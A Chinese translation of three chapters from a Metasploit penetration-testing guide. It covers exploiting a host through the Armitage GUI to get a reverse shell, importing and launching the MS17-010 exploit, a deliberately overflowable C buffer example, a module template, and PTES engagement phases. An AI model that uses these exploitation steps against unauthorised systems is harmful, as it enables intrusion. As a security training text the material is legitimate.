# Metasploit 完全指南（二）

> 原文：[`annas-archive.org/md5/7D3B5EAD1083E0AF434036361959F60E`](https://annas-archive.org/md5/7D3B5EAD1083E0AF434036361959F60E)
> 
> 译者：[飞龙](https://github.com/wizardforcel)
> 
> 协议：[CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/)

# 第九章：使用 Armitage 进行网络攻击管理

到目前为止，在本书中，您已经学会了在渗透测试生命周期的所有阶段使用 Metasploit 的各种基本和高级技术。我们已经使用 Metasploit 命令行界面`msfconsole`执行了所有这些操作。现在我们已经熟悉了如何使用`msfconsole`，让我们继续使用图形界面，这将使我们的渗透测试任务更加容易。在本章中，我们将涵盖以下主题：

+   Armitage 简介

+   启动 Armitage 控制台

+   扫描和枚举

+   查找合适的攻击

+   利用目标

# 什么是 Armitage？

简而言之，Armitage 只是一个用于执行和管理所有任务的 GUI 工具，否则这些任务可以通过`msfconsole`执行。

Armitage 帮助可视化目标，自动推荐合适的攻击，并在框架中公开高级的攻击后操作功能。

请记住，Armitage 在后台使用 Metasploit；因此，为了使用 Armitage，您需要在系统上运行一个正在运行的 Metasploit 实例。Armitage 不仅与 Metasploit 集成，还与其他工具（如 NMAP）集成，用于高级端口扫描和枚举。

Armitage 已经预装在默认的 Kali Linux 安装中。

# 启动 Armitage 控制台

在实际启动 Armitage 控制台之前，首先我们需要启动`postgresql`服务和 Metasploit 服务，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/f990c305-31c8-4aff-9fef-4751472e907d.jpg)

一旦 postgresql 和 Metasploit 服务正常运行，我们可以在命令行中输入`armitage`来启动 Armitage 控制台，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/4b099e6c-7f6f-4b37-aedf-ef27e01b7f43.jpg)

在初始启动时，`armitage`控制台显示如下屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/62f3efc3-139b-401a-a872-17d99c08a781.jpg)

现在 Armitage 控制台已经启动，让我们添加我们希望攻击的主机。要添加新主机，请单击“主机”菜单，然后选择“添加主机”选项。您可以一次添加单个主机或多个主机，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/26aec031-c62e-43ab-9a77-5251d9560021.jpg)

# 扫描和枚举

现在我们已经将目标主机添加到 Armitage 控制台，我们将执行一个快速端口扫描，以查看这里打开了哪些端口。要执行端口扫描，请右键单击主机，然后选择扫描选项，如下面的屏幕截图所示。这将在 Armitage 控制台的底部窗格中列出目标系统上的所有打开端口：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/7d020987-8ce6-4267-9268-d8a89b7b3d0c.jpg)

正如我们之前所见，Armitage 也与 NMAP 很好地集成。现在，我们将对目标进行 NMAP 扫描，以枚举服务并检测远程操作系统的版本，如下面的屏幕截图所示。要启动 NMAP 扫描，请单击“主机”选项，选择 NMAP 扫描，然后选择“快速扫描（OS 检测）”选项：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/7c550612-8c48-4413-8341-ac30409ea8da.jpg)

NMAP 扫描完成后，您会注意到我们目标主机上的 Linux 图标。

# 查找并发动攻击

在前面的部分中，我们将主机添加到 Armitage 控制台，并使用 NMAP 对其进行了端口扫描和枚举。现在，我们知道它正在运行基于 Debian 的 Linux 系统。下一步是找到与我们目标主机匹配的所有可能的攻击。为了获取所有适用的攻击，选择“攻击”菜单，然后单击“查找攻击”。现在，Armitage 控制台将查询后端数据库，以查找早期枚举中发现的所有可能匹配的漏洞利用，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/2a574a7f-6b1f-4a98-b21a-e2eee954cf59.jpg)

一旦 Armitage 控制台完成查询可能的利用，您可以通过右键单击主机并选择“攻击”菜单来查看适用的利用列表。在这种情况下，我们将尝试利用`postgresql`漏洞，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/c76ece10-3986-45f4-b02f-902d74b89bd7.jpg)

在选择攻击类型为 Linux 负载执行的 PostgreSQL 时，我们会看到以下屏幕截图中显示的几种利用选项。我们可以将其保留为“默认”，然后点击“启动”按钮：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/1d9aec81-eb1f-49f1-9c84-62900a61e5ea.jpg)

一旦我们发动了攻击，利用就会被执行。请注意主机图标的变化，如下面的屏幕截图所示。主机已成功被攻陷：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/70eac7e2-a4db-48c3-85b7-249e91fbde04.jpg)

现在我们的主机已被攻陷，我们在系统上获得了一个反向连接。我们可以进一步与其交互，上传任何文件和负载，或使用任何后渗透模块。要做到这一点，只需右键单击被攻陷的主机，选择“Shell 1”选项，然后选择“交互”选项，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/78029dba-3cfc-48b1-ba28-b96a21cc6bb3.jpg)

与被攻陷的主机进行交互时，在 Armitage 控制台的底部窗格中打开了一个名为“Shell 1”的新选项卡，如下面的屏幕截图所示。从这里，我们可以远程执行所有 Linux 命令：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/2880b1e3-356f-4fcf-8bf7-6bfa54bcebcb.jpg)

# 摘要

在本章中，您已经熟悉了使用 Armitage 工具在后台使用 Metasploit 进行网络攻击管理。Armitage 工具在同时对多个目标进行渗透测试时肯定会很方便，并节省大量时间。在下一章中，我们将学习如何通过添加自定义利用来进一步扩展 Metasploit 框架。

# 练习

尝试详细探索 Armitage 的各种功能，并使用它来攻陷任何目标 Windows 主机。


# 第十章：扩展 Metasploit 和利用开发

在上一章中，您学习了如何有效地使用 Armitage 轻松执行一些复杂的渗透测试任务。在本章中，我们将对利用开发进行高层次的概述。利用开发可能非常复杂和繁琐，是一个如此广泛的主题，以至于可以写一整本书。然而，在本章中，我们将试图了解利用开发是什么，为什么需要它，以及 Metasploit 框架如何帮助我们开发利用。本章将涵盖以下主题：

+   利用开发概念

+   将外部利用添加到 Metasploit

+   Metasploit 利用模板和混合技术介绍

# 利用开发概念

利用可以有许多不同的类型。它们可以根据平台、架构和服务目的等各种参数进行分类。每当发现任何给定的漏洞时，通常存在以下三种可能性之一：

+   已经存在利用代码

+   部分利用代码已经存在，需要一些修改才能执行恶意载荷

+   没有利用代码存在，需要从头开始开发新的利用代码

前两种情况看起来很容易，因为利用代码已经存在，可能只需要一些小的调整就可以执行。然而，第三种情况，即刚刚发现漏洞且没有利用代码存在的情况，才是真正的挑战。在这种情况下，您可能需要执行以下一些任务：

+   收集基本信息，例如漏洞支持的平台和架构

+   收集有关漏洞如何被利用以及可能的攻击向量的所有可能细节

+   使用模糊测试等技术来具体确定脆弱的代码和参数

+   编写伪代码或原型来测试利用是否真正有效

+   编写带有所有必需参数和值的完整代码

+   发布代码供社区使用，并将其转换为 Metasploit 模块

所有这些活动都非常紧张，需要大量的研究和耐心。利用代码对参数非常敏感；例如，在缓冲区溢出利用的情况下，返回地址是成功运行利用的关键。即使返回地址中的一个位被错误地提及，整个利用都会失败。

# 什么是缓冲区溢出？

缓冲区溢出是各种应用程序和系统组件中最常见的漏洞之一。成功的缓冲区溢出利用可能允许远程任意代码执行，从而提升权限。

当程序尝试在缓冲区中插入的数据超过其容量时，或者当程序尝试将数据插入到缓冲区之后的内存区域时，就会发生缓冲区溢出条件。在这种情况下，缓冲区只是分配的内存的连续部分，用于保存从字符串到整数数组的任何内容。尝试在分配的内存块的边界之外写入数据可能会导致数据损坏，使程序崩溃，甚至导致恶意代码的执行。让我们考虑以下代码：

```
#include <stdio.h>

void AdminFunction()
{
    printf("Congratulations!\n");
    printf("You have entered in the Admin function!\n");
}

void echo()
{
    char buffer[25];

    printf("Enter any text:\n");
    scanf("%s", buffer);
    printf("You entered: %s\n", buffer);    
}

int main()
{
    echo();

    return 0;
}
```

上述代码存在缓冲区溢出漏洞。如果仔细注意，缓冲区大小已设置为 25 个字符。但是，如果用户输入的数据超过 25 个字符会怎么样？缓冲区将简单地溢出，程序执行将突然结束。

# 模糊测试是什么？

在前面的示例中，我们可以访问源代码，并且我们知道变量缓冲区最多可以容纳 25 个字符。因此，为了引起缓冲区溢出，我们可以发送 30、40 或 50 个字符作为输入。然而，并非总是可能访问任何给定应用程序的源代码。因此，对于源代码不可用的应用程序，您如何确定应该发送多长的输入到特定参数，以便缓冲区溢出？这就是模糊器发挥作用的地方。模糊器是发送随机输入到目标应用程序中指定参数的小程序，并告知我们导致溢出和应用程序崩溃的输入的确切长度。

你知道吗？Metasploit 有用于模糊化各种协议的模糊器。这些模糊器是 Metasploit 框架中的辅助模块的一部分，可以在`auxiliary/fuzzers/`中找到。

# 漏洞利用模板和混合

假设您已经为一个新的零日漏洞编写了漏洞利用代码。现在，要将漏洞利用代码正式包含到 Metasploit 框架中，它必须以特定格式呈现。幸运的是，您只需要专注于实际的漏洞利用代码，然后简单地使用模板（由 Metasploit 框架提供）将其插入所需的格式中。Metasploit 框架提供了一个漏洞利用模块骨架，如下所示：

```
##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  def initialize(info={})
    super(update_info(info,
      'Name'           => "[Vendor] [Software] [Root Cause] [Vulnerability type]",
      'Description'    => %q{
        Say something that the user might need to know
      },
      'License'        => MSF_LICENSE,
      'Author'         => [ 'Name' ],
      'References'     =>
        [
          [ 'URL', '' ]
        ],
      'Platform'       => 'win',
      'Targets'        =>
        [
          [ 'System or software version',
            {
              'Ret' => 0x42424242 # This will be available in `target.ret`
            }
          ]
        ],
      'Payload'        =>
        {
          'BadChars' => "\x00\x00"
        },
      'Privileged'     => true,
      'DisclosureDate' => "",
      'DefaultTarget'  => 1))
  end

  def check
    # For the check command
  end

  def exploit
    # Main function
  end

end

```

现在，让我们试着理解前面的漏洞利用骨架中的各个字段：

+   **名称**字段：以供应商名称开头，然后是软件。**根本原因**字段指向发现错误的组件或功能，最后是模块正在利用的漏洞类型。

+   **描述**字段：此字段详细说明模块的功能、需要注意的事项和任何特定要求。目的是让用户清楚地了解他正在使用的内容，而无需实际查看模块的源代码。

+   **作者**字段：这是您插入姓名的地方。格式应为姓名。如果您想插入您的 Twitter 账号，只需将其作为注释留下，例如`姓名 #Twitterhandle`。

+   **参考**字段：这是与漏洞或漏洞利用相关的参考数组，例如公告、博客文章等。有关参考标识符的更多详细信息，请访问[`github.com/rapid7/metasploit-framework/wiki/Metasploit-module-reference-identifiers`](https://github.com/rapid7/metasploit-framework/wiki/Metasploit-module-reference-identifiers)

+   **平台**字段：此字段指示漏洞利用代码将支持的所有平台，例如 Windows、Linux、BSD 和 Unix。

+   **目标**字段：这是一个系统、应用程序、设置或特定版本的数组，您的漏洞利用的目标。每个目标数组的第二个元素是您存储目标特定元数据的位置，例如特定偏移量、小工具、`ret`地址等。当用户选择一个目标时，元数据将被加载并由`目标索引`跟踪，并可以使用目标方法检索。

+   **有效载荷**字段：此字段指定有效载荷应如何编码和生成。您可以指定 Space、SaveRegisters、Prepend、PrependEncoder、BadChars、Append、AppendEncoder、MaxNops、MinNops、Encoder、Nop、EncoderType、EncoderOptions、ExtendedOptions 和 EncoderDontFallThrough。

+   **披露日期**字段：此字段指定漏洞是在公开披露的日期，格式为 M D Y，例如，“2017 年 6 月 29 日”。

您的漏洞利用代码还应包括一个`check`方法，以支持`check`命令，但如果不可能的话，这是可选的。`check`命令将探测目标是否可利用漏洞。

最后，漏洞利用方法就像您的主要方法。从那里开始编写您的代码。

# Metasploit 混合是什么？

如果你熟悉 C 和 Java 等编程语言，你一定听说过函数和类等术语。C 中的函数和 Java 中的类基本上都允许代码重用。这使得程序更加高效。Metasploit 框架是用 Ruby 语言编写的。因此，从 Ruby 语言的角度来看，mixin 只是一个简单的包含在类中的模块。这将使类能够访问此模块的所有方法。

因此，不需要深入了解编程细节，你只需记住 mixin 有助于模块化编程；例如，你可能想执行一些 TCP 操作，比如连接到远程端口并获取一些数据。现在，要执行这个任务，你可能需要编写相当多的代码。但是，如果你使用已有的 TCP mixin，你将节省写整个代码的工作！你只需包含 TCP mixin 并根据需要调用相应的函数。因此，你无需重新发明轮子，可以节省大量时间和精力。

你可以通过浏览`/lib/msf/core/exploit`目录来查看 Metasploit 框架中提供的各种 mixin，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/d8e73b36-7848-4376-ad43-1a2db9858a2e.jpg)

Metasploit 框架中最常用的一些 mixin 如下：

+   `Exploit::Remote::Tcp`：此 mixin 的代码位于`lib/msf/core/exploit/tcp.rb`，并提供以下方法和选项：

+   TCP 选项和方法

+   定义 RHOST、RPORT 和 ConnectTimeout

+   `connect()`和`disconnect()`

+   创建 self.sock 作为全局套接字

+   提供 SSL、代理、CPORT 和 CHOST

+   通过小段发送进行规避

+   将用户选项公开为`rhost()`、`rport()`、`ssl()`等方法

+   `Exploit::Remote::SMB`：此 mixin 的代码是从 TCP mixin 继承而来，位于`lib/msf/core/exploit/smb.rb`，并提供以下方法和选项：

+   `smb_login()`

+   `smb_create()`

+   `smb_peer_os()`

+   提供了 SMBUser、SMBPass 和 SMBDomain 的选项

+   公开 IPS 规避方法，如`SMB::pipe_evasion`、`SMB::pad_data_level`和`SMB::file_data_level`

# 向 Metasploit 添加外部利用

每天都会发现各种应用程序和产品中的新漏洞。对于大多数新发现的漏洞，也会公开相应的利用代码。现在，利用代码通常是原始格式的（就像 shellcode 一样），不能直接使用。此外，在利用正式作为 Metasploit 框架中的模块之前可能需要一些时间。但是，我们可以手动将外部利用模块添加到 Metasploit 框架中，并像任何其他现有的利用模块一样使用它。让我们以最近被 Wannacry 勒索软件使用的 MS17-010 漏洞为例。默认情况下，MS17-010 的利用代码在 Metasploit 框架中是不可用的。

让我们从利用数据库中下载 MS17-010 模块开始。

你知道吗？[`www.exploit-db.com`](https://www.exploit-db.com)上的 Exploit-DB 是获取各种平台、产品和应用程序的新利用的最值得信赖和最新的来源之一。

只需在任何浏览器中打开[`www.exploit-db.com/exploits/41891/`](https://www.exploit-db.com/exploits/41891/)，并下载利用代码，它是以`ruby (.rb)`格式显示的，如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/b635786a-01f4-4360-9a42-c66456aac7df.jpg)

一旦下载了利用的 Ruby 文件，我们需要将其复制到 Metasploit 框架目录中，路径如下截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/eee3e35b-c16b-426e-945e-1ba276c3dc3f.jpg)

截图中显示的路径是预装在 Kali Linux 上的 Metasploit 框架的默认路径。如果你有自定义安装的 Metasploit 框架，你需要更改路径。

将新下载的漏洞利用代码复制到 Metasploit 目录后，我们将启动`msfconsole`并发出`reload_all`命令，如下面的屏幕截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/e198ef75-1145-45c2-b8d9-199b7bc0e746.jpg)

`reload_all`命令将刷新 Metasploit 的内部数据库，以包括新复制的外部漏洞利用代码。现在，我们可以像往常一样使用`use exploit`命令来设置和启动新的漏洞利用，如下面的屏幕截图所示。我们只需设置变量`RHOSTS`的值并启动利用：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/259ccf64-59e6-4924-89a8-70e32d898198.jpg)

# 摘要

在本章的总结中，您学习了各种漏洞利用开发概念，通过添加外部漏洞利用的各种方式扩展 Metasploit Framework，并介绍了 Metasploit 漏洞利用模板和混合功能。

# 练习

您可以尝试以下练习：

+   尝试探索以下内容的混合代码和相应功能：

+   捕获

+   Lorcon

+   MSSQL

+   KernelMode

+   FTP

+   FTP 服务器

+   EggHunter

+   在[`www.exploit-db.com`](https://www.exploit-db.com)上找到目前不包含在 Metasploit Framework 中的任何漏洞利用。尝试下载并导入到 Metasploit Framework 中。


# 第十一章：使用 Metasploit 进行渗透测试

**渗透测试**是对基于计算机的系统的有意攻击，其目的是发现漏洞、安全弱点，并验证系统是否安全。渗透测试将向组织提供建议，告知其安全状况是否容易受到攻击，已实施的安全是否足以抵御任何入侵，可以绕过哪些安全控制等等。因此，渗透测试侧重于改善组织的安全状况。

成功进行渗透测试在很大程度上取决于使用正确的工具和技术。渗透测试人员必须选择正确的工具和方法来完成测试。在谈论渗透测试的最佳工具时，首先想到的是 Metasploit。它被认为是今天进行渗透测试的最有效的审计工具之一。Metasploit 提供了各种各样的利用、优秀的利用开发环境、信息收集和 Web 测试能力等等。

在从基础到精英级别介绍 Metasploit 的过程中，我们将坚持逐步方法，如下图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/c26e8fb4-1b91-477b-a834-932e4d41793e.png)

本章将帮助您回顾渗透测试和 Metasploit 的基础知识，这将帮助您适应本书的节奏。

在本章中，您将学习以下主题：

+   渗透测试的各个阶段

+   Metasploit 框架的基础知识

+   Metasploit 利用和扫描模块的工作原理

+   使用 Metasploit 测试目标网络

+   使用数据库的好处

+   转向并深入内部网络

这里需要注意的一个重要点是，我们可能不会在一天内成为专业的渗透测试人员。这需要实践，熟悉工作环境，能够在关键情况下表现，最重要的是，了解我们如何在渗透测试的各个阶段之间循环。

当我们考虑在组织上进行渗透测试时，我们需要确保一切都设置正确，并符合渗透测试标准。因此，如果您觉得对渗透测试标准或术语**渗透测试执行标准**（**PTES**）不熟悉，请参考[`www.pentest-standard.org/index.php/PTES_Technical_Guidelines`](http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines)以更熟悉渗透测试和漏洞评估。根据 PTES，以下图解释了渗透测试的各个阶段：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/cpl-mtspl-gd/img/65d5a743-be85-4ded-85c3-05e1910bd383.png)

请参考渗透测试标准网站，[`www.pentest-standard.org/index.php/Main_Page`](http://www.pentest-standard.org/index.php/Main_Page) [设置硬件和系统化阶段，以便在设置工作环境时遵循。](http://www.pentest-standard.org/index.php/Main_Page)

# 组织渗透测试

在我们开始使用 Metasploit 进行复杂和复杂的攻击之前，让我们了解渗透测试的各个阶段，并看看如何在专业范围内组织渗透测试。

# 预交互

渗透测试的第一个阶段，预交互，涉及讨论关于在客户的组织、公司、学院或网络上进行渗透测试的关键因素，与客户本身进行讨论。这个阶段作为渗透测试人员、客户和他/她的需求之间的联系线。预交互帮助客户充分了解在他或她的网络/域或服务器上要执行的工作。

因此，测试人员将在这里充当客户的教育者。渗透测试人员还讨论测试范围，收集项目范围内所有领域的知识，以及在进行分析时可能需要的任何特殊要求。这些要求包括特殊权限，访问关键系统，网络或系统凭据等。项目的预期积极方面也应该在这个阶段与客户讨论。作为一个过程，预交互讨论以下一些关键点：

+   **范围**：本节审查项目的范围并估计项目的规模。范围还定义了测试的包含和排除内容。测试人员还讨论了范围内的 IP 范围和域以及测试类型（黑盒或白盒）。在白盒测试的情况下，测试人员还讨论了访问的种类和所需的凭据；测试人员还为管理员创建、收集和维护问卷。测试的时间表和持续时间，是否包括压力测试或不包括，以及付款都包括在范围内。一份一般的范围文件提供了以下问题的答案：

+   目标组织最重要的安全关注点是什么？

+   哪些特定主机、网络地址范围或应用程序应该被测试？

+   哪些特定主机、网络地址范围或应用程序明确不应该被测试？

+   是否有任何第三方拥有在范围内的系统或网络，并且他们持有哪些系统（目标组织必须事先获得书面许可）？

+   测试将在实时生产环境还是测试环境中进行？

+   渗透测试是否包括以下测试技术：网络范围的 ping 扫描、目标主机的端口扫描、目标的漏洞扫描、目标的渗透、应用程序级别的操纵、客户端 Java/ActiveX 反向工程、物理渗透尝试、社会工程？

+   渗透测试是否包括内部网络测试？如果是，如何获得访问权限？

+   客户/最终用户系统是否包含在范围内？如果是，将利用多少客户端？

+   是否允许社会工程？如果是，可能如何使用？

+   是否允许拒绝服务攻击？

+   是否允许危险检查/利用？

+   **目标**：本节讨论渗透测试设定的各种主要和次要目标。与目标相关的常见问题如下：

+   这次渗透测试的业务需求是什么？

+   测试是否是由监管审计要求的，还是只是标准程序？

+   目标是什么？

+   绘制漏洞地图

+   证明漏洞存在

+   测试事件响应

+   在网络、系统或应用程序中实际利用漏洞

+   以上所有内容

+   **测试术语和定义**：这个阶段讨论基本术语与客户，并帮助客户更好地理解这些术语

+   **规则约定**：本节定义测试时间、时间表、攻击权限和定期会议更新正在进行的测试的状态。与规则约定相关的常见问题如下：

+   您希望在什么时间进行这些测试？

+   在工作时间内

+   工作时间之后

+   周末时间

+   在系统维护窗口期间

+   这个测试将在生产环境中进行吗？

+   如果不应影响生产环境，是否存在可以用于进行渗透测试的类似环境（开发或测试系统）？

+   谁是技术联系人？

有关预交互的更多信息，请参阅：[`www.pentest-standard.org/index.php/File:Pre-engagement.png`](http://www.pentest-standard.org/index.php/File:Pre-engagement.png)。

# 情报收集/侦察阶段

在情报收集阶段，您需要尽可能收集有关目标网络的信息。目标网络可能是一个网站、一个组织，或者可能是一个成熟的财富公司。最重要的是从社交媒体网络中收集有关目标的信息，并使用 Google Hacking（一种使用特定查询从 Google 中提取敏感信息的方法）来查找与待测试组织相关的机密和敏感信息。使用主动和被动攻击对组织进行足迹定位也是一种方法。

情报收集阶段是渗透测试中最关键的方面之一。对目标正确获得的知识将帮助测试人员模拟适当和准确的攻击，而不是尝试所有可能的攻击机制；它还将帮助测试人员节省相当多的时间。这个阶段将消耗测试总时间的 40%到 60%，因为获取对目标的访问主要取决于系统的足迹有多好。

渗透测试人员必须通过进行各种扫描来获取关于目标的充分了解，寻找开放端口、服务识别，并选择哪些服务可能存在漏洞以及如何利用它们进入所需的系统。

在这个阶段遵循的程序需要确定目标基础设施上当前部署的安全策略和机制，以及它们可以被规避到什么程度。

让我们用一个例子来讨论这个问题。考虑对一个客户要求进行网络压力测试的 Web 服务器进行黑盒测试。

在这里，我们将测试服务器，以检查服务器能够承受多少带宽和资源压力，或者简单来说，服务器如何响应**拒绝服务**（**DoS**）攻击。DoS 攻击或压力测试是指向服务器发送无限请求或数据的过程，以检查服务器是否能够成功处理和响应所有请求，或者导致 DoS 崩溃。如果目标服务容易受到特制请求或数据包的攻击，也可能发生 DoS。为了实现这一点，我们启动我们的网络压力测试工具，并向目标网站发起攻击。然而，启动攻击几秒钟后，我们发现服务器没有响应我们的浏览器，网站也无法打开。此外，一个页面显示网站目前处于离线状态。那么这意味着什么？我们成功地关闭了我们想要的网络服务器吗？没有！实际上，这是服务器管理员设置的一种保护机制的迹象，它察觉到我们恶意意图关闭服务器，因此导致我们的 IP 地址被禁止。因此，在发动攻击之前，我们必须收集正确的信息并确定目标处的各种安全服务。

更好的方法是从不同的 IP 范围测试 Web 服务器。也许保留两到三个不同的虚拟专用服务器进行测试是正确的方法。此外，我建议您在将这些攻击向真实目标发动之前，在虚拟环境中测试所有攻击向量。攻击向量的正确验证是强制性的，因为如果我们在攻击之前不验证攻击向量，可能会导致目标服务崩溃，这是不可取的。网络压力测试应该在参与或维护窗口的最后阶段进行。此外，向客户要求将用于测试的 IP 地址列入白名单始终是有帮助的。

现在，让我们看第二个例子。考虑对 Windows 2012 服务器进行黑盒测试。在扫描目标服务器时，我们发现端口`80`和端口`8080`是开放的。在端口`80`上，我们看到运行着最新版本的**Internet Information Services** (**IIS**)，而在端口`8080`上，我们发现运行着易受**远程代码执行**漏洞影响的**Rejetto HFS Server**的脆弱版本。

然而，当我们尝试利用这个易受攻击的 HFS 版本时，攻击失败了。这种情况是防火墙阻止恶意入站流量的典型场景。

在这种情况下，我们可以简单地改变我们连接回服务器的方式，这将建立从目标回到我们系统的连接，而不是我们直接连接到服务器。这种改变可能会更成功，因为防火墙通常被配置为检查入站流量而不是出站流量。

作为一个过程，这个阶段可以分解为以下关键点：

+   **目标选择**: 选择要攻击的目标，确定攻击的目标和攻击的时间。

+   **隐蔽收集**: 这涉及从物理场所、使用的设备和垃圾箱中收集数据。这个阶段只是定位白盒测试的一部分。

+   **足迹**: 足迹包括主动或被动扫描，以识别目标上部署的各种技术和软件，包括端口扫描、横幅抓取等。

+   **识别保护机制**：这涉及识别防火墙、过滤系统、基于网络和主机的保护等。

有关情报收集的更多信息，请参阅：[`www.pentest-standard.org/index.php/Intelligence_Gathering`](http://www.pentest-standard.org/index.php/Intelligence_Gathering)。

# 威胁建模

威胁建模有助于进行全面的渗透测试。这个阶段侧重于对真实威胁的建模，它们的影响以及基于它们可能造成的影响进行分类。根据情报收集阶段的分析，我们可以建模出最佳的攻击向量。威胁建模适用于业务资产分析、流程分析、威胁分析和威胁能力分析。这个阶段回答以下一系列问题：

+   我们如何攻击特定网络？

+   我们需要获得对哪些关键部分的访问权限？

+   哪种方法最适合攻击？

+   最高评级的威胁是什么？

建模威胁将帮助渗透测试人员执行以下一系列操作：

+   收集关于高级威胁的相关文档

+   根据分类基础确定组织的资产

+   识别和分类风险

+   将威胁映射到公司的资产

建模威胁将有助于定义具有风险的最高优先级资产。

考虑对公司网站进行黑盒测试。在这里，关于公司客户的信息是主要资产。在同一后端的不同数据库中，也可能存储了交易记录。在这种情况下，攻击者可以利用 SQL 注入的威胁跨越到交易记录数据库。因此，交易记录是次要资产。通过了解影响，我们可以将 SQL 注入攻击的风险映射到资产上。

漏洞扫描器如**Nexpose**和 Metasploit 的专业版可以通过自动化方法精确快速地建模威胁。因此，在进行广泛测试时，它可能会很有用。

有关威胁建模阶段涉及的流程的更多信息，请参阅：[`www.pentest-standard.org/index.php/Threat_Modeling`](http://www.pentest-standard.org/index.php/Threat_Modeling)。

# 漏洞分析

漏洞分析是发现系统或应用程序中缺陷的过程。这些缺陷可以从服务器到 Web 应用程序，从不安全的应用程序设计到易受攻击的数据库服务，从基于 VOIP 的服务器到基于 SCADA 的服务。这个阶段包含三种不同的机制，即测试、验证和研究。测试包括主动和被动测试。验证包括删除错误的阳性结果，并通过手动验证确认漏洞的存在。研究是指验证发现的漏洞并触发它以证明其存在。

有关威胁建模阶段涉及的过程的更多信息，请参阅：[`www.pentest-standard.org/index.php/Vulnerability_Analysis`](http://www.pentest-standard.org/index.php/Vulnerability_Analysis)。

# 利用和后渗透

利用阶段涉及利用先前发现的漏洞。这个阶段是实际的攻击阶段。在这个阶段，渗透测试人员在系统的目标漏洞上启动利用程序以获取访问权限。这个阶段在整本书中都有详细介绍。

后渗透阶段是利用的后阶段。这个阶段涵盖了我们可以在被利用的系统上执行的各种任务，如提升权限、上传/下载文件、枢纽等。

有关利用阶段涉及的过程的更多信息，请参阅：[`www.pentest-standard.org/index.php/Exploitation`](http://www.pentest-standard.org/index.php/Exploitation)。

有关后渗透的更多信息，请参阅[`www.pentest-standard.org/index.php/Post_Exploitation`](http://www.pentest-standard.org/index.php/Post_Exploitation)。

# 报告

在进行渗透测试时，创建整个渗透测试的正式报告是最后一个阶段。识别关键漏洞、创建图表和图形、建议和提出修复措施是渗透测试报告的重要部分。整本书的后半部分都专门讨论了报告。

有关威胁建模阶段涉及的过程的更多信息，请参阅：[`www.pentest-standard.org/index.php/Reporting`](http://www.pentest-standard.org/index.php/Reporting)。

# 搭建环境

成功的渗透测试在很大程度上取决于您的工作环境和实验室的配置。此外，成功的测试回答以下一系列问题：

+   你的测试实验室配置得如何？

+   所有测试所需的工具都齐全吗？

+   你的硬件支持这些工具有多好？

在我们开始测试任何东西之前，我们必须确保所有所需的工具集都可用并已更新。

# 在虚拟环境中设置 Kali Linux

在使用 Metasploit 之前，我们需要有一个测试实验室。建立测试实验室的最佳方法是收集不同的机器并在它们上安装不同的操作系统。然而，如果我们只有一个设备，最好的方法是建立一个虚拟环境。

虚拟化在今天的渗透测试中扮演着重要的角色。由于硬件成本高昂，虚拟化在渗透测试中起到了节约成本的作用。在主机操作系统下模拟不同的操作系统不仅可以节省金钱，还可以节省电力和空间。然而，建立一个虚拟渗透测试实验室可以防止对实际主机系统的任何修改，并允许我们在隔离的环境中执行操作。虚拟网络使网络利用在隔离的网络中运行，从而防止对主机系统的任何修改或使用网络硬件。

此外，虚拟化的快照功能有助于在特定时间点保留虚拟机的状态。这个功能非常有帮助，因为我们可以在测试虚拟环境时比较或重新加载操作系统的先前状态，而无需在攻击模拟后修改文件的情况下重新安装整个软件。

虚拟化期望主机系统具有足够的硬件资源，如 RAM、处理能力、驱动器空间等，以便顺利运行。

有关快照的更多信息，请参阅：[`www.virtualbox.org/manual/ch01.html#snapshots`](https://www.virtualbox.org/manual/ch01.html#snapshots)。

因此，让我们看看如何使用 Kali 操作系统创建虚拟环境（这是渗透测试中最受欢迎的操作系统，其中默认包含 Metasploit 框架）。

您可以随时在此处下载 Kali Linux 的预构建 VMware 和 VirtualBox 映像：[`www.offensive-security.com/kali-linux-vmware-virtualbox-image-download/`](https://www.offensive-security.com/kali-linux-vm-vmware-virtualbox-hyperv-image-download/)。

要创建虚拟环境，我们需要虚拟机软件。我们可以使用两种最流行的虚拟机软件之一：VirtualBox 和 VMware Workstation Player。因此，让我们通过执行以下步骤开始安装：

1.  下载 VMware Workstation Player（[`my.vmware.com/web/vmware/free#desktop_end_user_computing/vmware_workstation_player/14_0`](https://my.vmware.com/web/vmware/free#desktop_end_user_computing/vmware_workstation_player/14_0)）并为您的机器架构设置它。

1.  运行设置并完成安装。

